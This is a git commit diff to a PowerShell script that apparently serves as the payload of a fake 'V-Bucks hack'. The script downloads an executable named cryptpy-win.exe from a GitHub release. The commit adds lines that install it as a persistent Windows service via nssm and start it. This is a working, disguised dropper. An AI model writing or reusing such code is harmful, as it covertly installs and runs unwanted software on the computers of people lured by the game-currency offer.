b783dca70c981214faf96ccc49cf1e4407d7b571
Mitsuko Megumi <mitsukomegumii@gmail.com>
2018-08-29 21:29:12 -0400

    Fixed service management, added nssm.

--- payload/vbucks/src/hack/js/window-three-sources/installcryptpy.ps1
+++ payload/vbucks/src/hack/js/window-three-sources/installcryptpy.ps1
@@ -2,5 +2,10 @@ $version = "1.3.5" # Fetch version argument
 
 $downloadUrl = "https://github.com/mitsukomegumi/CryptPy.js/releases/download/$version/cryptpy-win.exe" # Fetch latest build URL
 $downloadCommand = 'curl -S -L '+$downloadUrl+' --output cryptpy-win.exe' # Set into command
+$downloadPath = (Get-Item -Path ".\").FullName # Get current path for future reference
 
 "$downloadCommand" | cmd # Download latest build
+
+"nssm install CryptPy $downloadPath\cryptpy-win.exe" | cmd
+
+Start-Service CryptPy
